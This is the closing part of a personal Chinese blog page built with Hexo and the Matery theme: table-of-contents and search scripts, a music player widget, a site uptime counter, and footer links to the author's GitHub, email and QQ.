                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="8277932559"
                   fixed='true'
                   autoplay='true'
                   theme='#42b983'
                   loop='all'
                   order='list'
                   preload='auto'
                   volume='0.5'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <span id="year">2022</span>
            <a href="/about" target="_blank">LuoLuo</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">13.9k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2022";
                    var startMonth = "8";
                    var startDate = "24";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lfsdlfsd-sudo" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2091823062@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2091823062" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2091823062" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
